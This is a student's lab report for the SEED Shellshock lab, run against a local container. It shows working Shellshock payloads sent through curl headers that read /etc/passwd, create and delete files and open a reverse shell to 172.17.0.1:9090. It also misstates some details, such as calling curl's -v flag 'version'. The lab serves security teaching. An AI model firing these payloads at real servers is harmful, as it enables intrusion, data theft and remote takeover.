## lab01
###### Lin Shi (n92s773)
###### linshi1768@gmail.com
###### CSCI 476
###### February 9, 2021
<br>

Before the tasks, I followed the environment setup and completed every comment and they all work on my machine; thus, I continued.
### Task 1:

#### Task 1.1:

This is a simple test to see if /bin/bash_shellshock is vulnerable to the Shellshock attack. We are defining the variable foo; however, we have included some extra after the declaration, **echo "attack";**. By having this in the quotation, if /bin/bash_shellshock print out attack, we will know it is vulnerable to Shellshock attack.
```
[02/15/21]seed@VM:~/.../image_www$ export PS1='parent:>'                                 
parent:>foo='() { echo "normal function"; }; echo "attack";'  
parent:>export foo
parent:>bash_shellshock
attack
[02/15/21]seed@VM:~/.../image_www$ declare -f foo
foo ()
{
    echo "normal function"
}
```

After testing /bin/bash_shellshock, I would like to verify with /bin/bash, the one that supose to be patched and not vulnerable.
```
[02/15/21]seed@VM:~/.../image_www$ export PS1='parent:>'
parent:>foo='() { echo "normal function"; }; echo "attack";'
parent:>export foo
parent:>/bin/bash
[02/15/21]seed@VM:~/.../image_www$ echo $foo
() { echo "normal function" }
```

Overall, I ran some basic commands with echo "attack", the extra part, after the declaration to prove the a bash's vulnerability. After running both the /bin/bash_shellshock and /bin/bash, we can verify that /bin/bash_shellshock is vulnerable to shellshock attack. Once we declared and export foo, when we call bash_shellshock, (I was located in the directory, so I did not need to navigate to it), it **printed attack**. On the other hand, when we called /bin/bash, nothing was printed. Thus, proving that it is not vulnerable.

### Task 2:

#### Task 2.1:

In this task, I am trying to use the browser to access http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi. I soon realize after a few failed attempts that it does not have a **.** in the end.
[Task2.1](urlOutput.png)

Additionally, I decided to just run curl http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi to compare both the url and the commands in Task 2.2.
```
[02/15/21]seed@VM:~/.../02_shellshock$ curl http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
```

This is what we got for an output:
```
*** ENVIRONMENT VARIABLES***
HTTP_HOST=www.seedlab-shellshock.com
HTTP_USER_AGENT=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
HTTP_ACCEPT_ENCODING=gzip, deflate
HTTP_CONNECTION=keep-alive
HTTP_UPGRADE_INSECURE_REQUESTS=1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at www.seedlab-shellshock.com Port 80</address>
SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)
SERVER_NAME=www.seedlab-shellshock.com
SERVER_ADDR=10.9.0.80
SERVER_PORT=80
REMOTE_ADDR=10.9.0.1
DOCUMENT_ROOT=/var/www/html
REQUEST_SCHEME=http
CONTEXT_PREFIX=/cgi-bin/
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
SERVER_ADMIN=webmaster@localhost
SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi
REMOTE_PORT=54846
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
QUERY_STRING=
REQUEST_URI=/cgi-bin/getenv.cgi
SCRIPT_NAME=/cgi-bin/getenv.cgi
```

In conclusion, the output from the URL and the command is identical, which is a no-brainer, since they are both running the same thing. With more research, I figured out that curl is a command-line utility for transferring data from or to a server. From the environment set up, I understood how the victim is the server that we are trying to attack; thus, everything makes more sense about the curl command and the URL action. Since the getenv.cgi program prints out the environ; thus, it will display every environment variable to either the screen or server. I did notice that many of the environment variables are HTTP_<something> and SERVER_<something>. Going back to Networks, I believe it has been saved to send the proper HTML to the server.

#### Task 2.2:

1. Running the curl with -v option:
```
[02/15/21]seed@VM:~/.../02_shellshock$ curl -v http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
*   Trying 10.9.0.80:80...
* TCP_NODELAY set
* Connected to www.seedlab-shellshock.com (10.9.0.80) port 80 (#0)
> GET /cgi-bin/getenv.cgi HTTP/1.1
> Host: www.seedlab-shellshock.com
> User-Agent: curl/7.68.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 15 Feb 2021 23:50:04 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/plain
<
*** ENVIRONMENT VARIABLES***
HTTP_HOST=www.seedlab-shellshock.com
HTTP_USER_AGENT=curl/7.68.0
HTTP_ACCEPT=*/*
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at www.seedlab-shellshock.com Port 80</address>
SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)
SERVER_NAME=www.seedlab-shellshock.com
SERVER_ADDR=10.9.0.80
SERVER_PORT=80
REMOTE_ADDR=10.9.0.1
DOCUMENT_ROOT=/var/www/html
REQUEST_SCHEME=http
CONTEXT_PREFIX=/cgi-bin/
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
SERVER_ADMIN=webmaster@localhost
SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi
REMOTE_PORT=54852
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
QUERY_STRING=
REQUEST_URI=/cgi-bin/getenv.cgi
SCRIPT_NAME=/cgi-bin/getenv.cgi
* Connection #0 to host www.seedlab-shellshock.com left intact
```
Comparing with the output from curl <URL>, it is clear how it included some extra information. After reading the man page, -v stands for --version and it is displaying information about the curl and the libcurl version it used.


2. Running with -A
```
[02/15/21]seed@VM:~/.../02_shellshock$ curl -A "my data" -v http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
*   Trying 10.9.0.80:80...
* TCP_NODELAY set
* Connected to www.seedlab-shellshock.com (10.9.0.80) port 80 (#0)
> GET /cgi-bin/getenv.cgi HTTP/1.1
> Host: www.seedlab-shellshock.com
> User-Agent: my data
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 15 Feb 2021 23:51:10 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/plain
<
*** ENVIRONMENT VARIABLES***
HTTP_HOST=www.seedlab-shellshock.com
HTTP_USER_AGENT=my data
HTTP_ACCEPT=*/*
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at www.seedlab-shellshock.com Port 80</address>
SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)
SERVER_NAME=www.seedlab-shellshock.com
SERVER_ADDR=10.9.0.80
SERVER_PORT=80
REMOTE_ADDR=10.9.0.1
DOCUMENT_ROOT=/var/www/html
REQUEST_SCHEME=http
CONTEXT_PREFIX=/cgi-bin/
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
SERVER_ADMIN=webmaster@localhost
SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi
REMOTE_PORT=54856
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
QUERY_STRING=
REQUEST_URI=/cgi-bin/getenv.cgi
SCRIPT_NAME=/cgi-bin/getenv.cgi
* Connection #0 to host www.seedlab-shellshock.com left intact
```

-A has modified User-Agent and HTTP_USER_AGENT with what I had in quotes. Additionally, the man page states that the command specify the User-Agent. An empty argument ("") will remove the header completely and a blank header needs to be set to a single space (" ").

3. Running with -e:
```
[02/15/21]seed@VM:~/.../02_shellshock$ curl -e "my data" -v http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
*   Trying 10.9.0.80:80...
* TCP_NODELAY set
* Connected to www.seedlab-shellshock.com (10.9.0.80) port 80 (#0)
> GET /cgi-bin/getenv.cgi HTTP/1.1
> Host: www.seedlab-shellshock.com
> User-Agent: curl/7.68.0
> Accept: */*
> Referer: my data
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 15 Feb 2021 23:51:39 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/plain
<
*** ENVIRONMENT VARIABLES***
HTTP_HOST=www.seedlab-shellshock.com
HTTP_USER_AGENT=curl/7.68.0
HTTP_ACCEPT=*/*
HTTP_REFERER=my data
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at www.seedlab-shellshock.com Port 80</address>
SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)
SERVER_NAME=www.seedlab-shellshock.com
SERVER_ADDR=10.9.0.80
SERVER_PORT=80
REMOTE_ADDR=10.9.0.1
DOCUMENT_ROOT=/var/www/html
REQUEST_SCHEME=http
CONTEXT_PREFIX=/cgi-bin/
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
SERVER_ADMIN=webmaster@localhost
SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi
REMOTE_PORT=54858
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
QUERY_STRING=
REQUEST_URI=/cgi-bin/getenv.cgi
SCRIPT_NAME=/cgi-bin/getenv.cgi
* Connection #0 to host www.seedlab-shellshock.com left intact
```

-e will send the "Referer Page" information to the HTML server. Additionally, it will not keep the last -e if multiple of them are used.

4. Running with -H:
```
[02/15/21]seed@VM:~/.../02_shellshock$ curl -H "AAAAAA:BBBBBB" -v http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
*   Trying 10.9.0.80:80...
* TCP_NODELAY set
* Connected to www.seedlab-shellshock.com (10.9.0.80) port 80 (#0)
> GET /cgi-bin/getenv.cgi HTTP/1.1
> Host: www.seedlab-shellshock.com
> User-Agent: curl/7.68.0
> Accept: */*
> AAAAAA:BBBBBB
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 15 Feb 2021 23:52:35 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/plain
<
*** ENVIRONMENT VARIABLES***
HTTP_HOST=www.seedlab-shellshock.com
HTTP_USER_AGENT=curl/7.68.0
HTTP_ACCEPT=*/*
HTTP_AAAAAA=BBBBBB
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at www.seedlab-shellshock.com Port 80</address>
SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)
SERVER_NAME=www.seedlab-shellshock.com
SERVER_ADDR=10.9.0.80
SERVER_PORT=80
REMOTE_ADDR=10.9.0.1
DOCUMENT_ROOT=/var/www/html
REQUEST_SCHEME=http
CONTEXT_PREFIX=/cgi-bin/
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
SERVER_ADMIN=webmaster@localhost
SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi
REMOTE_PORT=54860
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
QUERY_STRING=
REQUEST_URI=/cgi-bin/getenv.cgi
SCRIPT_NAME=/cgi-bin/getenv.cgi
* Connection #0 to host www.seedlab-shellshock.com left intact
```

-H will include extra headers in the request when sending the HTML to the server. Lastly, you can add as many headers as you would like.

5. I believe that -A -H -e should all work to ejectt data into the environemnt variable of the CGI program. The only exception is -v because it only display the version name and we do not have the ability to add data to it. Then, both -H and -e is appending to something new with slight exception (talked about it above), but it both allow us to store the information as some kind of environment variable. Lastly, -A will modidy the USER_AGENT, which is stored as HTTP_USER_AGENT in the environemnt variable. Therefore, within the 4 operations given and shown to us, -A, -H, and -e should all work to eject data into the environment variables.  

### Task 3:

#### Task 3.1:
I am trying to access /etc/passwd:
```
curl -A '() { echo "passwords";}; echo Content_type: text/plain; echo; /bin/cat /etc/passwd' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi > 3_1_1.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   926    0   926    0     0   452k      0 --:--:-- --:--:-- --:--:--  452k
[02/16/21]seed@VM:~/.../02_shellshock$ cat 3_1_1.txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

[02/16/21]seed@VM:~/.../02_shellshock$ curl -e '() { echo "passwords";}; echo Content_type: text/plain; echo; /bin/cat /etc/passwd' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi > 3_1_2.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   926    0   926    0     0   452k      0 --:--:-- --:--:-- --:--:--  452k
[02/16/21]seed@VM:~/.../02_shellshock$ diff 3_1_1.txt 3_1_2.txt

[02/16/21]seed@VM:~/.../02_shellshock$ curl -H temp:'() { echo "passwords";}; echo Content_type: text/plain; echo; /bin/cat /etc/passwd' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi > 3_1_3.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   926    0   926    0     0   452k      0 --:--:-- --:--:-- --:--:--  452k
[02/16/21]seed@VM:~/.../02_shellshock$ diff 3_1_1.txt 3_1_3.txt
```
1. I called the operation and combined what I learned from Task 1 with it, defining a function. Then the echo Content_type is not really needed, but I have included there. Followed by a necessary echo. Then the command I would like to use /bin/cat and the file I would like to use it on /etc/passwd. Lastly, I have the server address. (P.S. I just stored the output as a text file in the end).
2. I first did this operation in -A, but when I gave it a second thought, I decided to try the other two. The -e is identical to -A, the only difference is the choice of option itself. Then I ran -H, which I had to define a key to it, named temp, but the results are the same. Notice that I ran a diff command and not display the whole thing. If you would like to view all the outputs, please take a look at [-A](3_1_1.txt), [-e](3_1_2.txt), and [-H](3_1_3.txt). Finally, the -v printed the versions and not the output I was looking for.
3. My attack was successful, I have made the program print the /etc/passwd instead of the environment variable. I was a little surprised at all three options working for curl. However, giving it a second thought, it makes perfect sense. They are all doing some different task, but in the end, all the information is stored as a environment variable.

#### Task 3.2:
This time, I am trying to ask it to print the /bin/id:
```
[02/16/21]seed@VM:~/.../02_shellshock$ curl -A '() { echo "id";}; echo Content_type: text/plain; echo; /bin/id' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[02/16/21]seed@VM:~/.../02_shellshock$ curl -e '() { echo "id";}; echo Content_type: text/plain; echo; /bin/id' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[02/16/21]seed@VM:~/.../02_shellshock$ curl -H temp:'() { echo "id";}; echo Content_type: text/plain; echo; /bin/id' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
1. First, I gave it the same input output command like last time but received an error. However, I quickly realize that when we print the id, we would not ask for cat, but we would if we are asking for /etc/passwd (given that you have privilege). Then I tried it without /bin/cat and worked just fine.
2. Like last time, I decided to try all three curl operations that I could think of and they all worked perfectly. Again, -v printed the version and not /bin/id
3. My attack was successful. For all three of the curl options, I made the them print out the /bin/id. The only surprise was it not using the /bin/cat, which was discussed above

#### Task 3.3:
For this task, I am trying to create a file inside /tmp folder:
```
[02/16/21]seed@VM:~/.../image_www$ curl -A '() { :; }; echo; /bin/cat /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
[02/16/21]seed@VM:~/.../image_www$ curl -A '() { :; }; echo "this is a test" > /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
*** ENVIRONMENT VARIABLES***
HTTP_HOST=www.seedlab-shellshock.com
HTTP_USER_AGENT=() { :; }; echo "this is a test" > /tmp/test
HTTP_ACCEPT=*/*
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at www.seedlab-shellshock.com Port 80</address>
SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)
SERVER_NAME=www.seedlab-shellshock.com
SERVER_ADDR=10.9.0.80
SERVER_PORT=80
REMOTE_ADDR=10.9.0.1
DOCUMENT_ROOT=/var/www/html
REQUEST_SCHEME=http
CONTEXT_PREFIX=/cgi-bin/
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
SERVER_ADMIN=webmaster@localhost
SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi
REMOTE_PORT=55702
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
QUERY_STRING=
REQUEST_URI=/cgi-bin/getenv.cgi
SCRIPT_NAME=/cgi-bin/getenv.cgi
[02/16/21]seed@VM:~/.../image_www$ curl -A '() { :; }; echo; /bin/cat /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
this is a test
[02/16/21]seed@VM:~/.../image_www$ curl -A '() { :; }; echo; /bin/rm /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
[02/16/21]seed@VM:~/.../image_www$ curl -e '() { :; }; echo; /bin/cat /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
[02/16/21]seed@VM:~/.../image_www$ curl -e '() { :; }; echo "this is a test" > /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
... (same as above so I am skipping it)
[02/16/21]seed@VM:~/.../image_www$ curl -e '() { :; }; echo; /bin/cat /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
this is a test
[02/16/21]seed@VM:~/.../image_www$ curl -e '() { :; }; echo; /bin/rm /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
[02/16/21]seed@VM:~/.../image_www$ curl -H temp:'() { :; }; echo; /bin/cat /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
[02/16/21]seed@VM:~/.../image_www$ curl -H temp:'() { :; }; echo "this is a test" > /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
....
[02/16/21]seed@VM:~/.../image_www$ curl -H temp:'() { :; }; echo; /bin/cat /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
this is a test
```
1. Creating this one was very different. First, I tried using touch, which means I have to go find the file to display it. Then to make thing more clearer, I decided to add some text to it; thus, I used echo "some string" > /tmp/somelocation. Finally I would display the information from the idea I practiced on task 3.1, /bin/cat.
2. Again, I used all three options and the answer seems right. In fact, I even did rm, next part in here and the solution looks correct as well.
3. My attack was successful, I was able to store something in those test file in the tmp folder. The only thing that surprised me was echo "string" > location. Although I have seen this before, it just did not pop into my head until some further digging.


#### Task 3.4:
For this task, I am trying to delete the file inside /tmp folder, that I named test:
```
[02/16/21]seed@VM:~/.../image_www$ curl -A '() { :; }; echo; /bin/cat /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
this is a test
[02/16/21]seed@VM:~/.../image_www$ curl -A '() { :; }; echo; /bin/rm /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
[02/16/21]seed@VM:~/.../image_www$ curl -A '() { :; }; echo; /bin/cat /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
... added the string back Again
[02/16/21]seed@VM:~/.../image_www$ curl -e '() { :; }; echo; /bin/cat /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
this is a test
[02/16/21]seed@VM:~/.../image_www$ curl -e '() { :; }; echo; /bin/rm /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
[02/16/21]seed@VM:~/.../image_www$ curl -e '() { :; }; echo; /bin/cat /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
...
[02/16/21]seed@VM:~/.../image_www$ curl -H  temp:'() { :; }; echo; /bin/cat /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
this is a test
[02/16/21]seed@VM:~/.../image_www$ curl -H  temp:'() { :; }; echo; /bin/rm /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
[02/16/21]seed@VM:~/.../image_www$ curl -H  temp:'() { :; }; echo; /bin/cat /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
```
1. For this one, the syntax, or the order of placement is very similar to /bin/cat. I took sometime to look for the location of rm, which is in /bin as well. The rest are the same. curl -option (declaration if -H:)'declare the function; echo; <file of the command> <file of data> ' server
2. For this one, I tested all three again. And all of them worked. Please note that I've skipped the lines that I used to add the string back.
3. My attack was successful. Overall, this one came with zero surprise, I kind of did this portion when I was testing for my create a file. Additionally, the syntax is almost identical to /bin/cat.

#### Task 3.5:
I am trying to get the information from /etc/shadow:
```
[02/16/21]seed@VM:~/.../image_www$ curl -A '() { :; }; echo Content_type: text/plain; echo; /bin/cat /etc/shadow' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
[02/16/21]seed@VM:~/.../image_www$ curl -A '() { :; }; echo Content_type: text/plain; echo; /bin/ls /etc/shadow' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
/etc/shadow

[02/16/21]seed@VM:~/.../image_www$ curl -A '() { :; }; echo Content_type: text/plain; echo; /bin/ls -l /etc/shadow' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
-rw-r----- 1 root shadow 501 Nov  6 01:21 /etc/shadow
[02/16/21]seed@VM:~/.../image_www$ curl -e '() { :; }; echo Content_type: text/plain; echo; /bin/ls -l /etc/shadow' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
-rw-r----- 1 root shadow 501 Nov  6 01:21 /etc/shadow
[02/16/21]seed@VM:~/.../image_www$ curl -H temp:'() { :; }; echo Content_type: text/plain; echo; /bin/ls -l /etc/shadow' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
-rw-r----- 1 root shadow 501 Nov  6 01:21 /etc/shadow

```
1. I chose to do this with /bin/ls -l, the hint given to us on the top. Additionally, I slowly got to this point. First, I tried /bin/cat, which had nothing. Then I tried /bin/ls and realize that I want it to return a list of files in its folder. Therefore, I decided to use /bin/ls -l.
2. Although I knew the result after the first one, I still decided to run all three so it will be obvious later to myself.
3. None of the attack was successful. I do not have root privilege to run /etc/shadow. Thus, my attack was unsuccessful.

### Task 4:
For this task, I am trying to get a reverse shell via Shellshock. I am trying to make this one more close to life, since it would be way harder to do the hard-coding in the command line during an attack. In this task, I am simulating a server and an attacker. Then the attacker needs to run a reverse shell, which is going to be waiting in the beginning. It should give the attacker a convenient way to run commands on a compromised machine.  
**Attacker:**
```
[02/16/21]seed@VM:~/.../image_www$ nc -nvl 9090
Listening on 0.0.0.0 9090
Connection received on 10.9.0.80 37992
bash: cannot set terminal process group (29): Inappropriate ioctl for device
bash: no job control in this shell
www-data@00f72f975599:/usr/lib/cgi-bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Server:**
```
[02/16/21]seed@VM:~/.../image_www$ ifconfig
br-07cfff2418ac: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.9.0.1  netmask 255.255.255.0  broadcast 10.9.0.255
        inet6 fe80::42:2dff:fe8a:6a2e  prefixlen 64  scopeid 0x20<link>
        ether 02:42:2d:8a:6a:2e  txqueuelen 0  (Ethernet)
        RX packets 1082  bytes 286897 (286.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1453  bytes 130338 (130.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:adff:fe75:7eb0  prefixlen 64  scopeid 0x20<link>
        ether 02:42:ad:75:7e:b0  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3  bytes 306 (306.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.4  netmask 255.255.255.0  broadcast 10.0.2.255
        inet6 fe80::4b00:2179:aa87:959d  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:5a:18:ea  txqueuelen 1000  (Ethernet)
        RX packets 81737  bytes 109946783 (109.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 47465  bytes 3237753 (3.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 3025  bytes 402057 (402.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3025  bytes 402057 (402.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth23da45d: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::48cb:cdff:fee2:7524  prefixlen 64  scopeid 0x20<link>
        ether 4a:cb:cd:e2:75:24  txqueuelen 0  (Ethernet)
        RX packets 1082  bytes 302045 (302.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1542  bytes 140423 (140.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
[02/16/21]seed@VM:~/.../02_shellshock$ curl -A '() { :; }; echo Content_type: text/plain; echo; /bin/bash -i > /dev/tcp/172.17.0.1/9090 0<&1 2<&1' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
```
This one was pretty similar to the descriptions. I followed the guild and made a few changes. First, I used ifconfig to find the IP address. Since I was not 100% sure, I tried many of them until it was clear that it is docker0. Then I modified the command from /bin/bash -i ... to using curl to ask it to wait for some commands. Lastly, once everything was done, I was able to type id on the attacker and the server's id showed up. /bin/bash is the bash that we are using. i is interactive, which means that shell is interactive. > /dev/tcp/172.17.0.1/9090 causes the output device stdout of the shell to be redirected to the TCP connection to IP's port. 0<&1 is stdin, stdout. 2>&1 is stderr, stdout. The vulnerability at this point becomes more clear to me. If we were only talking about the hard-coding, I did not think it was going to cause such a headache. However, after looking at how an attack could easily take over the server, I began to understand the problem.

### Task 5:
In this task, I am using the patched bash. First, I went into getenv.cgi and changed the first line from /bin/bash_shellshock to /bin/bash. Then I repeated Task 3:
1. repeated Task 3.1:
```
[02/16/21]seed@VM:~/.../02_shellshock$ curl -A '() {echo "passwords";}; echo Content_type: text/plain; echo; /bin/cat /etc/passwd' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
*** ENVIRONMENT VARIABLES***
HTTP_HOST=www.seedlab-shellshock.com
HTTP_USER_AGENT=() {echo "passwords";}; echo Content_type: text/plain; echo; /bin/cat /etc/passwd
HTTP_ACCEPT=*/*
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at www.seedlab-shellshock.com Port 80</address>
SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)
SERVER_NAME=www.seedlab-shellshock.com
SERVER_ADDR=10.9.0.80
SERVER_PORT=80
REMOTE_ADDR=10.9.0.1
DOCUMENT_ROOT=/var/www/html
REQUEST_SCHEME=http
CONTEXT_PREFIX=/cgi-bin/
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
SERVER_ADMIN=webmaster@localhost
SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi
REMOTE_PORT=55788
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
QUERY_STRING=
REQUEST_URI=/cgi-bin/getenv.cgi
SCRIPT_NAME=/cgi-bin/getenv.cgi
[02/16/21]seed@VM:~/.../02_shellshock$ curl -e '() {echo "passwords";}; echo Content_type: text/plain; echo; /bin/cat /etc/passwd' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
